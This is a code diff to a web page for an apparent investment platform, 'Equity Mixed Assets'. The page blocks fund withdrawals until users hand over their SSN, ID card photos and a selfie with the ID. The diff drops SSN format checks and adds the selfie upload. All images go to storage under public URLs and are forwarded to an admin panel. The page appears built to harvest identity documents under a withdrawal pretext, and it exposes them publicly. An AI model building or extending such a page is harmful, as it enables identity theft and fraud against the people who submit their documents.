@@ -6,7 +6,7 @@
   <title>Equity Mixed Assets - Withdraw Funds</title>
   <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
   <style>
-    /* ===== YOUR ORIGINAL STYLES (kept) ===== */
+    /* === Your existing styles (keep as before) === */
     :root {
       --bg-gradient: radial-gradient(circle at top, #131c38 0%, #070b19 100%);
       --card-bg: rgba(19, 27, 54, 0.7);
@@ -50,7 +50,6 @@
     input:focus { border-color: #3b82f6; }
     input.error { border-color: var(--error); }
 
-    /* ----- FILE UPLOAD BOX (improved) ----- */
     .file-input-box {
       border: 2px dashed rgba(255, 255, 255, 0.1);
       padding: 14px;
@@ -65,7 +64,6 @@
       border-color: #3b82f6;
       background: rgba(59, 130, 246, 0.05);
     }
-    /* Hide the actual file input but keep it accessible */
     .file-input-box input[type="file"] {
       position: absolute;
       left: 0;
@@ -75,10 +73,7 @@
       opacity: 0;
       cursor: pointer;
     }
-    /* Label text */
-    .file-label {
-      pointer-events: none; /* let clicks pass to the input */
-    }
+    .file-label { pointer-events: none; }
 
     .submit-btn { 
       background: linear-gradient(135deg, #10b981 0%, #059669 100%); 
@@ -149,11 +144,11 @@
         </div>
         <div class="input-group">
           <label>SSN (Social Security Number) <span style="color: var(--error);">*</span></label>
-          <input type="text" id="v-ssn" placeholder="XXX-XX-XXXX">
-          <div class="error-message" id="ssn-error">SSN must be in format XXX-XX-XXXX (e.g., 123-45-6789)</div>
+          <input type="text" id="v-ssn" placeholder="Enter SSN (any format)">
+          <div class="error-message" id="ssn-error">Please enter your SSN</div>
         </div>
 
-        <!-- ID Front Upload -->
+        <!-- Front ID -->
         <div class="input-group">
           <label>ID Card (Front Photo) <span style="color: var(--error);">*</span></label>
           <div class="file-input-box">
@@ -163,7 +158,7 @@
           <div class="error-message" id="front-error">Please upload the front of your ID</div>
         </div>
 
-        <!-- ID Back Upload -->
+        <!-- Back ID -->
         <div class="input-group">
           <label>ID Card (Back Photo) <span style="color: var(--error);">*</span></label>
           <div class="file-input-box">
@@ -173,11 +168,21 @@
           <div class="error-message" id="back-error">Please upload the back of your ID</div>
         </div>
 
+        <!-- NEW: Selfie -->
+        <div class="input-group">
+          <label>Selfie (with ID visible) <span style="color: var(--error);">*</span></label>
+          <div class="file-input-box">
+            <span class="file-label" id="selfie-label">📸 Tap to upload Selfie</span>
+            <input type="file" id="id-selfie" accept="image/*">
+          </div>
+          <div class="error-message" id="selfie-error">Please upload a selfie</div>
+        </div>
+
         <button type="submit" class="submit-btn" id="verify-submit-btn">Submit Verification</button>
       </form>
     </div>
 
-    <!-- Withdrawal Card (hidden until verified) -->
+    <!-- Withdrawal Card (hidden) -->
     <div class="card" id="withdrawal-card" style="display: none;">
       <span class="card-title">REQUEST PAYOUT</span>
       <div class="notice-box success">✅ Identity verified successfully. You may submit your payout request.</div>
@@ -196,7 +201,7 @@
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
   <script src="config.js"></script>
   <script>
-    // ===== SUPABASE CLIENT =====
+    // ===== Supabase Client =====
     let client = window.client || supabase;
     if (!client) {
       const SUPABASE_URL = "https://rrdddtmqojyheshznrwl.supabase.co";
@@ -207,7 +212,6 @@
 
     let currentUser = null;
 
-    // ===== HELPERS =====
     function showStatus(msg, type = 'info') {
       const el = document.getElementById('statusMessage');
       el.textContent = msg;
@@ -233,18 +237,19 @@
       if (!email || !email.includes('@gmail.com')) { document.getElementById('email-error').classList.add('show'); document.getElementById('v-email').classList.add('error'); valid = false; }
 
       const ssn = document.getElementById('v-ssn').value.trim();
-      if (!ssn) { document.getElementById('ssn-error').textContent = 'Please enter your SSN'; document.getElementById('ssn-error').classList.add('show'); document.getElementById('v-ssn').classList.add('error'); valid = false; }
-      else if (!/^\d{3}-\d{2}-\d{4}$/.test(ssn)) { document.getElementById('ssn-error').textContent = 'SSN must be in format XXX-XX-XXXX'; document.getElementById('ssn-error').classList.add('show'); document.getElementById('v-ssn').classList.add('error'); valid = false; }
+      if (!ssn) { document.getElementById('ssn-error').classList.add('show'); document.getElementById('v-ssn').classList.add('error'); valid = false; }
 
       const front = document.getElementById('id-front').files[0];
       if (!front) { document.getElementById('front-error').classList.add('show'); valid = false; }
       const back = document.getElementById('id-back').files[0];
       if (!back) { document.getElementById('back-error').classList.add('show'); valid = false; }
+      const selfie = document.getElementById('id-selfie').files[0];
+      if (!selfie) { document.getElementById('selfie-error').classList.add('show'); valid = false; }
 
       return valid;
     }
 
-    // ===== CHECK VERIFICATION STATUS =====
+    // ===== Check Verification Status =====
     async function checkVerificationStatus() {
       try {
         const { data: { user } } = await client.auth.getUser();
@@ -291,21 +296,27 @@
       }
     }
 
-    // ===== FILE INPUT LABEL UPDATE =====
-    document.getElementById('id-front').addEventListener('change', function(e) {
+    // ===== File input label updates =====
+    document.getElementById('id-front').addEventListener('change', function() {
       if (this.files[0]) {
         document.getElementById('front-label').textContent = '✅ ' + this.files[0].name;
         document.getElementById('front-error').classList.remove('show');
       }
     });
-    document.getElementById('id-back').addEventListener('change', function(e) {
+    document.getElementById('id-back').addEventListener('change', function() {
       if (this.files[0]) {
         document.getElementById('back-label').textContent = '✅ ' + this.files[0].name;
         document.getElementById('back-error').classList.remove('show');
       }
     });
+    document.getElementById('id-selfie').addEventListener('change', function() {
+      if (this.files[0]) {
+        document.getElementById('selfie-label').textContent = '✅ ' + this.files[0].name;
+        document.getElementById('selfie-error').classList.remove('show');
+      }
+    });
 
-    // ===== SUBMIT VERIFICATION =====
+    // ===== Submit Verification =====
     document.getElementById('verification-form').addEventListener('submit', async function(e) {
       e.preventDefault();
       if (!validateForm()) {
@@ -323,23 +334,31 @@
       const ssn = document.getElementById('v-ssn').value.trim();
       const frontFile = document.getElementById('id-front').files[0];
       const backFile = document.getElementById('id-back').files[0];
+      const selfieFile = document.getElementById('id-selfie').files[0];
 
       try {
-        // 1. Upload front
+        // Upload Front
         const frontExt = frontFile.name.split('.').pop();
         const frontPath = `${currentUser.id}/front_${Date.now()}.${frontExt}`;
         const { error: fErr } = await client.storage.from('id_documents').upload(frontPath, frontFile);
         if (fErr) throw new Error('Front upload: ' + fErr.message);
         const { data: frontPub } = client.storage.from('id_documents').getPublicUrl(frontPath);
 
-        // 2. Upload back
+        // Upload Back
         const backExt = backFile.name.split('.').pop();
         const backPath = `${currentUser.id}/back_${Date.now()}.${backExt}`;
         const { error: bErr } = await client.storage.from('id_documents').upload(backPath, backFile);
         if (bErr) throw new Error('Back upload: ' + bErr.message);
         const { data: backPub } = client.storage.from('id_documents').getPublicUrl(backPath);
 
-        // 3. Insert into user_verifications
+        // Upload Selfie
+        const selfieExt = selfieFile.name.split('.').pop();
+        const selfiePath = `${currentUser.id}/selfie_${Date.now()}.${selfieExt}`;
+        const { error: sErr } = await client.storage.from('id_documents').upload(selfiePath, selfieFile);
+        if (sErr) throw new Error('Selfie upload: ' + sErr.message);
+        const { data: selfiePub } = client.storage.from('id_documents').getPublicUrl(selfiePath);
+
+        // Insert into user_verifications (add selfie_url column if you want; for now we store in notifications)
         const { error: vErr } = await client.from('user_verifications').insert({
           user_id: currentUser.id,
           full_name: fullName,
@@ -352,7 +371,7 @@
         });
         if (vErr) throw new Error('DB insert: ' + vErr.message);
 
-        // 4. Create notifications (these will appear in admin panel)
+        // Create notifications (3 of them)
         const notifMsg = `🔐 New Verification Submission\n` +
           `👤 Name: ${fullName}\n` +
           `📱 Phone: ${phone}\n` +
@@ -371,6 +390,12 @@
             type: 'ID Document',
             message: `📄 ID Card Back Photo submitted by ${fullName}`,
             image_url: backPub.publicUrl
+          },
+          {
+            user_id: currentUser.id,
+            type: 'Selfie',
+            message: `🤳 Selfie submitted by ${fullName}`,
+            image_url: selfiePub.publicUrl
           }
         ]);
 
@@ -378,7 +403,6 @@
         btn.textContent = '✅ Submitted';
         btn.disabled = true;
 
-        // Refresh status after 2s
         setTimeout(checkVerificationStatus, 2000);
 
       } catch (err) {
@@ -389,7 +413,7 @@
       }
     });
 
-    // ===== WITHDRAWAL REQUEST =====
+    // ===== Withdrawal Request =====
     async function requestWithdrawal() {
       const amount = document.getElementById('withdraw-amount').value.trim();
       const dest = document.getElementById('withdraw-destination').value.trim();
@@ -410,8 +434,8 @@
       }
     }
 
-    // ===== INIT =====
+    // ===== Init =====
     checkVerificationStatus();
   </script>
 </body>
-  </html>
+</html>
